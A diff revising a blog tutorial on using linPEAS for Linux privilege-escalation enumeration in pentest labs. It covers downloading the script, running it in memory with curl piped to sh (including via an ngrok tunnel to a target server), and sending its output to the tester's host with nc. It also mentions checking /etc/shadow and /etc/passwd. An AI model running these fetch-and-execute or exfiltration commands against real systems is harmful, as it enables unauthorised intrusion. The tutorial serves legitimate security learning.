@@ -9,21 +9,12 @@ If you wish to try operations depicted in the following article, please make sur
 
 .
 
-> During research when writing this article I found out that people claimed they were failed the exams for using linPEAS for privilege escalation. So be cautious about it. **Using the linPEAS on the exam (ex. OSCP) can make you fail the exam**, but supposedly only when you use the version with automated privilege escalation. Read more about it in the [Reddit thread](https://www.reddit.com/r/oscp/comments/mw4idk/heads_up_dont_use_linpeas_on_the_exam/).
+> During research when writing this article I found out that people claimed they were failed the exams for using linPEAS for privilege escalation. So be cautious about it. Using the linPEAS on the exam (ex. OSCP) can make you fail the exam, but supposedly only when you use the version with automated privilege escalation. Read more about it in the [Reddit thread](https://www.reddit.com/r/oscp/comments/mw4idk/heads_up_dont_use_linpeas_on_the_exam/).  
+> **Update**: MuirlandOracle created an [issue on GitHub](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/issues/125) for that case of exam fail, and author got the positive response from the Offensive Security for the updated version of linPEAS, but still, be aware of all these when using it on the exam.
 
-*Last update: 2021/05/17*
+*Last update: 2022/01/20*
 
-***
-# Contents
-
-1. [Obtaining linPEAS](#obtaining-linpeas)
-2. [Usage examples](#usage-examples)
-3. [Detailed analysis](#detailed-analysis)
-4. [Questions? Suggestions?](#questions-suggestions)
-5. [Additional readings](#additional-readings)
-***
-
-%%[patreon-btn]
+%%[support-cta]
 
 # Obtaining linPEAS
 
@@ -38,13 +29,13 @@ The way I use linPEAS is `wget`ting the single script file to its own directory 
 $ wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -O linpeas.sh 
 ```
 
-This way you download only the file you'll need. I found it as a perfect way of keeping up-to-date with these single-file tools, because I don't want to have full-blown Git repository with the history version.
+This way, you download only the file you'll need. I found it as a perfect way of keeping up-to-date with these single-file tools because I want to avoid having a full-blown Git repository with the history version.
 
 To get linPEAS for the first time and for the later updates, just run `update.sh` script.
 
 ## Clone the repository
 
-To get local copy one way is to clone a linPEAS [GitHub repository](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).
+To get a local copy, one way is to clone a linPEAS [GitHub repository](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).
 
 ```sh
 $ mkdir linpeas
@@ -58,7 +49,7 @@ And update with the simple (assuming you didn't make any changes)
 $ git pull
 ```
 
-The major drawback is that it clones **whole** repository - linPEAS, winPEAS and other miscellaneous files.The advantage of this approach is that it will definitely work when linPEAS starts depending on another files.
+The major drawback is that it clones **the whole** repository - linPEAS, winPEAS and other miscellaneous files. The advantage of this approach is that it will definitely work when linPEAS starts, depending on another files.
 
 ## In-memory execution
 
@@ -68,15 +59,15 @@ When you don't want to store anything on your or any other machine that is a tar
 $ curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
 ```
 
-[Back to top](#contents) ⤴
-
 # Usage examples
 
-Depending on your needs you might want to try different approaches.
+%%[join-cta]
+
+Depending on your needs, you might want to try different approaches.
 
 ## Locally
 
-Because why not? For my example - first I'm taking **the snapshot of my VM** just to make sure I can revert environment to the state before executing any pentesting tool on my daily system. I strongly advise you too, if you want to try it on your own.
+Because why not? For my example - first, I'm taking **the snapshot of my VM** just to make sure I can revert the environment to the state before executing any pentesting tool on my daily system. I strongly advise you, too, if you want to try it on your own.
 
 ```sh
 $ sudo adduser --shell /usr/bin/zsh ckent
@@ -110,11 +101,11 @@ $ python3 -m http.server 80 #python -m SimpleHTTPServer 80
 $ curl {IP}/linpeas.sh | sh
 ```
 
-If target machine have access to the internet and can access the linPEAS from GitHub - of course you can call it as previously.
+If the target machine has access to the internet and can access the linPEAS from GitHub - of course, you can call it as previously.
 
 ## Public network
 
-When you are targeting server via public IP, you cannot `curl` directly from your localhost, unless connection is tunneled via some external IP. The simplest way is combination of `ngrok` and Python server from the previous example.
+When you are targeting a server via public IP, you cannot `curl` directly from your localhost, unless the connection is tunneled via some external IP. The simplest way is the combination of `ngrok` and Python server from the previous example.
 
 > Download the executable from [the official site](https://ngrok.com/). You can find there also very informative manual. It is a very helpful application. One quick remark is that without registration `ngrok` allow creating time-limited HTTP/HTTPS tunnel to your host. When registered time limitation is lifted and `ngrok` can be used to create, for example, TCP connections.
 
@@ -144,17 +135,17 @@ $ cp /opt/linpeas/linpeas.sh .
 $ python3 -m http.server 80 #python -m SimpleHTTPServer 80
 ```
 
-And from the target server I request the script using the external HTTP address `ngrok` generated - in this example it is `http://01513f63ed1d.ngrok.io`
+And from the target server, I request the script using the external HTTP address `ngrok` generated - in this example it is `http://01513f63ed1d.ngrok.io`
 
 ```sh
 $ curl http://01513f63ed1d.ngrok.io/linpeas.sh | sh
 ```
 
-Of course, you can also `curl` it from the Github - but it is always safer to use something verified (`linPEAS` is often updated which can lead to some [unwanted results](https://www.offensive-security.com/offsec/understanding-pentest-tools-scripts/))
+Of course, you can also `curl` it from the GitHub - but it is always safer to use something verified (`linPEAS` is often updated, which can lead to some [unwanted results](https://www.offensive-security.com/offsec/understanding-pentest-tools-scripts/))
 
 ## Redirecting output to the host
 
-Useful trick is redirecting output of the script to your host. This is useful technique not only for linPEAS but for every other tool, script or a command you want to have the output of on your host. This requires `netcat` to be on the target server.
+A useful trick is redirecting the output of the script to your host. This is a useful technique not only for linPEAS but for every other tool, script or a command you want to have the output of on your host. This requires `netcat` to be on the target server.
 
 > Well, hypothetically because you can serve a `nc` binary and download it the same way as you do with the linPEAS script.
 
@@ -168,9 +159,7 @@ $ nc -lvnp 9002 | tee linpeas.out
 $ curl {IP}/linpeas.sh | sh | nc {IP} 9002
 ```
 
-> Sometimes this doesn't work so before that validate `nc` can connect via the specified port. If that is successful, continue. If not, change the port. I've encountered this in one or two boxes when I had to use "legit" port like 443.
-
-[Back to top](#contents) ⤴
+> Sometimes this doesn't work so before that validate `nc` can connect via the specified port. If that is successful, continue. If not, change the port. I've encountered this in one or two boxes when I had to use "legit" port, like 443.
 
 # Detailed analysis
 
@@ -293,20 +282,6 @@ I don't know any commands, so how you approach this depends on your experience a
 
 Not many, just a pure experience and knowledge. Check for `/etc/shadow` and `/root/` read permissions, hashes in `/etc/passwd` or if this file is writable.
 
-> Like what you see? Join the [Hashnode.com](https://hashnode.com/@Asentinn/join) now. Things that are awesome:
-
->✔ Automatic GitHub Backup
-
->✔ Write in Markdown
-
->✔ Free domain mapping
-
->✔ CDN hosted images
-
->✔ Free in-built newsletter service
-
-> By using my link you can help me unlock the ambasador role, which gives me some additional features to support my content creation mojo.
-
 [Back to top](#contents) ⤴
 
 # Questions? Suggestions?
@@ -315,17 +290,9 @@ And you? Are you familiar with the linPEAS? How do you use it? Do you think it i
 
 > 👍 Please do share in the comments below and show your support by giving a like! 
 
-> 🔔 `CyberEthical.Me` is maintained purely from your donations - consider one-time sponsoring on the [Sponsor](/sponsor) button or 🎁 [become a Patron](https://www.patreon.com/cyberethicalme) which also gives you some bonus perks.
-
 # Additional readings
 
-> 📌 Follow the `#CyberEthical` hashtag on the social media
-
-> 👉 Instagram: [@cyber.ethical.me](https://www.instagram.com/cyber.ethical.me/)
-
-> 👉 Twitter: [@cyberethical_me](https://twitter.com/cyberethical_me)
-
-> 👉 Facebook: [@CyberEthicalMe](https://facebook.com/CyberEthicalMe)
+%%[follow-cta]
 
 * [linPEAS @ GitHub](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
 * [Linux Privilege Escalation](https://book.hacktricks.xyz/linux-unix/privilege-escalation)
